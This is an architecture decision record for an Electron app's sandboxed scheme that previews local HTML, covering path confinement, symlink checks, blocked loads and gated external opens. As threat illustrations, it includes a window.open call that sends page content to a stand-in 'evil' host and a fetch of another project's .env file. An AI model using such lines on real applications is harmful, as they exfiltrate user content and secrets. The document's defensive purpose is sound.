# ADR 0005 — A confined `conduit-preview:` scheme for rendering local HTML

**Status:** accepted · **Date:** 2026-09-18
**Spec:** `docs/specs/archive/2026-09-18-html-document-viewing.md` · **Plan:** `docs/plans/2026-09-18-html-document-viewing.plan.md`

## Context

Conduit could open an `.html` file in Monaco but never render it. Measured before the work
started: opening one mounts the code editor and nothing else — no viewer chrome, no rendered
surface, not even the `.docpage` document treatment Markdown gets. The only affordance was an
`Open in browser` row sitting last in the tab menu, whose justifying comment read *"HTML files
have no faithful in-editor render (the in-app webview is http(s)-only by design)"*.

That comment was accurate. The `<webview>` guest used by the in-app browser refuses a non-http(s)
`src` at three independent layers: `normalizeUrl` in the renderer, `hardenWebviewPrefs` at
`will-attach-webview`, and an app-level `will-navigate` guard. Measured: submitting a `file://`
URL to the browser prompt leaves the modal open and mounts zero guests, silently.

The refusal exists for a good reason. A guest that can load `file://` is a guest that can read
the disk, and confinement would have to be enforced by the renderer promising to only pass safe
paths — the wrong side of the trust boundary.

The alternative considered and rejected was rendering sanitized HTML inline, the way the Markdown
viewer does (`rehype-raw` → `rehype-sanitize`). It cannot render a real page: it strips the
scripts, cannot resolve relative assets, and the renderer's CSP is `default-src 'none'` with no
`frame-src`, so an iframe path is closed too. A "preview" that silently drops half the document
is worse than no preview.

## Decision

Render local HTML in a `<webview>` guest over a **new privileged scheme**, `conduit-preview:`,
with confinement moved **into the main process**.

1. **One opaque token per workspace root is the URL host.**
   `conduit-preview://<rootToken>/<path-below-that-root>`, tokens minted per app run, resolved
   through a `token → root` table the renderer never sees. Each root is therefore its own web
   origin.

   The first draft used the **volume** as the host (`conduit-preview://g/...`). That makes an
   entire drive a single origin: a previewed page could `fetch('conduit-preview://g/other-project/.env')`,
   be same-origin, pass the root check, and read it. Every file in every open root would have
   been readable by any previewed page — including a page an agent wrote into the workspace,
   which is the motivating use case. One token per root means the browser refuses a cross-root
   read before our handler is consulted. Within a single root a page can read that root's files,
   which is correct: it is the project you opened.

2. **The scheme is registered `standard: true, secure: true, supportFetchAPI: true,
   corsEnabled: false`, before `app.ready`.** Without `standard`, the URL is not hierarchical,
   relative resolution does not work, and the origin is opaque — which the guest's forced
   `webSecurity: true` would then use to block every subresource. The entire URL shape depends
   on this registration.

3. **Confinement is enforced only in the main process**, per request, by
   `isInsideAnyRoot(abs, roots())` **and** `isInsideAnyRoot(realPathLeaf(abs), roots())`. Both,
   because `isInsideAnyRoot` is purely lexical: it catches `../..` and does **not** catch a
   symlink escape, which is what `realPathLeaf` exists for. This is the pair `fs-dnd` and
   `fs-import` already use, one notch stronger than `md:image`'s single check.

4. **Traversal is refused at the parse boundary, and the parse is hand-written.** Measured: the
   WHATWG `URL` parser collapses dot segments before anything can inspect them — `.../a/../b`,
   `.../a/%2e%2e/b` and `.../a/%2E%2E/b` all yield pathname `/b`. A traversal check built on
   `URL` would be decorative.

5. **Scripts in the previewed page run, and the page's resource loads are blocked by default.**
   The pair is the whole safety argument. A preview that cannot run the page's own JS renders a
   broken document, so blocking scripts was not an option; unrestricted network access alongside
   running scripts would let a page that read your disk post it anywhere. Blocked loads raise a
   bar naming the host, with an `Allow` that lifts the block for **that guest only** — the same
   block-then-offer shape the Markdown viewer already uses for remote images.

6. **The allow flag is keyed on the guest's `webContentsId`, not on the document.**
   `session.fromPartition()` returns one process-global session accepting one request listener,
   and Conduit is multi-window. A per-document flag was unimplementable: allowing a report in one
   window would have unblocked an unrelated one in another, and the notice could only have been
   broadcast to every window. The host owns the flag because the host is the enforcement point.

7. **External opens from a preview guest are gated like a blocked resource.** Routing them to
   `shell.openExternal` passes the full URL **including its query string**, so
   `window.open('https://evil/?d=' + btoa(document.documentElement.outerHTML))` would exfiltrate
   with nothing blocked and no bar shown. `HandlerDetails` carries no user-gesture flag, so a
   click and a script are indistinguishable; the gate is the only honest answer.

8. **The guest runs in an in-memory partition**, never `persist:webview`, so a repo's page never
   shares cookies, storage or cache with pages browsed in the in-app browser.

9. **A host precheck answers before any `src` is set.** A `<webview>` fires `did-fail-load` for
   network-level failure only — an HTTP error status just renders as a page, and the host never
   learns the code. Every error state therefore needs a signal that exists *before* the load, so
   the renderer asks `html:canPreview(path)` and renders the typed reason. The handler still
   returns real statuses as defence in depth for sub-resources, which have no precheck.

## Consequences

**What is now reachable.** A local HTML document renders with its own CSS, images and scripts,
relative paths resolving against the URL with no injected `<base>`. `http(s)` browser tabs are
untouched: the guest navigation guard is *session-aware* rather than globally widened, so only a
preview guest may navigate a preview URL.

**What is still refused.** `file:`, `data:`, `javascript:` and every other scheme, at the same
three layers as before. A path outside every open workspace root, and a symlink that leaves one.
A UNC path, which has no token mapping in v1. Anything over an 8 MB document cap.

**What this explicitly does NOT claim.** "The network is blocked" means **resource loads are
blocked**. `webRequest` cannot reach WebRTC, and it cannot see `dns-prefetch`/`preconnect`
hostname leaks. Those remain open, and a page that wants to signal a hostname to a server it
controls can still do so. The control that matters is that a page cannot *exfiltrate content*
without the user allowing a host by name.

**The invariant this changes.** `src/webview-guard.ts` previously stated http(s)-only as *the*
rule, pinned by `test/unit/webview-guard.test.ts`. It now admits exactly one more scheme. The
resulting guarantee is **stronger**, not weaker, than what it replaces: confinement moved from
"the renderer promises to pass only http(s)" to "the host resolves every byte through a root
table and refuses anything else". The guard's tests pin the old volume-shaped URL as *refused*,
so a malformed token fails closed.

**Where the confinement lives, for whoever reads this next.** `electron/preview-protocol.ts`, and
nowhere else. Nothing in the renderer is load-bearing for it. A change there that looks like a
convenience — resolving a path in the renderer, widening the token check, allowing a second
scheme — is a security change.

**Cost accepted.** One OS process per previewed tab, and only the active document's guest stays
mounted, so returning to a preview tab reloads it. The in-memory session is not cleared for the
life of the app run, so it accumulates cache from every host the user allowed; "in-memory" here
means "never written to disk", not "discarded per tab".
